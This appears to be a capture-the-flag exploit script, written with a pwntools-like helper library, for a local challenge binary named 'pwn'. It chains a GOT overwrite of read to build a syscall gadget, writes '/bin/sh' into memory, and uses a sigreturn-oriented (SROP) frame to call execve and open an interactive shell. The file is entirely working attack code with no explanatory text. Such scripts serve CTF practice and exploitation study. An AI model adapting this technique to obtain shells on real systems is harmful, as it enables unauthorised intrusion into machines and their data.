#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit.basic import *

exe = context.binary = ELF("./pwn")
host = args.HOST or "0.0.0.0"
port = int(args.PORT or 1337)

gdbscript = """
tbreak main
b *0x401175
b *0x0000000040110C
continue
""".format(
    **locals()
)

libc = SetupLibcELF()
io = start()

binsh_str = 0x404818
payload1 = (
    b"A" * 4
    + p32(exe.got.read)
    + b"A" * 8
    + p(0x000000000040115A)
    + b"\xff" * 12
    + p(0xFF)
    + b"A" * 4
    + p(exe.sym.main)
)  # craft syscall

payload2 = (
    b"\x15" * 4
    + p32(binsh_str)
    + b"\xff" * 8
    + p(0x000000000040115A)
    + b"\xff" * 12
    + p(0xFF)
    + b"A" * 4
    + p(exe.sym.main)
)  # write binsh

payload3 = b"\x00" * 4 + p32(15) + b"\x00" * 8 + p(exe.sym.read)  # execute execve

frame = SigreturnFrame()
frame.rax = 0x3B
frame.rdi = binsh_str
frame.rsi = 0
frame.rdx = 0
frame.rip = exe.sym.read
payload3 += bytes(frame)

s(p32(0x100))

sleep(1)

s(payload1[:0x100])

sleep(1)

s(b"\xaf")

success("Crafted syscall")
sleep(1)

s(p32(0x100))

sleep(1)

s(payload2[:0x100])

sleep(1)

s(b"/bin/sh\x00")

success("Wrote binsh")
sleep(1)

s(p32(0x100))

sleep(1)

success("Executing shell...")
s(payload3[:0x100])

io.interactive()
